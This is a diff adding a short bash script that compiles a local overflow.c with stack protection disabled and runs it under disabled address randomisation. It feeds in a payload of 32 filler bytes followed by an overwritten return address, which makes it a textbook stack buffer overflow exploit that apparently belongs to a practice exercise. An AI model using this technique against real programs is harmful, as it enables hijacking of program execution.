@@ -1,0 +1,10 @@
+#!/bin/bash
+
+set -e
+
+# build
+gcc -o overflow -fno-stack-protector overflow.c
+
+# run
+PAYLOAD=$(python -c "print 'A'*32 + '\x9b\x84\x04\x08'")
+setarch $(arch) -R ./overflow <<< $PAYLOAD
